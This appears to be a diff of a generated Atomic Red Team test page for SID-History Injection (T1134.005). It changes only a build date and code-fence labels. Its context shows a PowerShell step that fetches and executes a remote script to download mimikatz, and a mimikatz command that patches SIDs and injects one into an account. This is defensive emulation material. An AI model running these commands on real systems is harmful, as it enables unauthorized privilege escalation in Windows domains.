@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1134.005"
 attack_technique_name: "Access Token Manipulation: SID-History Injection"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1134.005/T1134.005.yaml"
-build_date: "2026-04-26 14:38:40"
+build_date: "2026-04-26 17:02:12"
 executor: "command_prompt"
 aliases:
   - "6bef32e5-9456-4072-8f14-35566fb85401"
@@ -64,14 +64,14 @@ Mimikatz executor must exist on disk and at specified location (#{mimikatz_path}
 
 ### Prerequisite Check
 
-```text
+```powershell
 $mimikatz_path = cmd /c echo #{mimikatz_path}
 if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
 IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1" -UseBasicParsing) 
@@ -89,13 +89,13 @@ Invoke-FetchFromZip $zipUrl "x64/mimikatz.exe" $basePath
 
 ### Command
 
-```commandprompt
+```cmd
 #{mimikatz_path} "privilege::debug" "sid::patch" "sid::add /sid:#{sid_to_inject} /sam:#{sam_account_name}" "exit"
 ```
 
 ### Cleanup
 
-```commandprompt
+```cmd
 #{mimikatz_path} "sid::clear /sam:#{sam_account_name}" "exit"
 ```
 
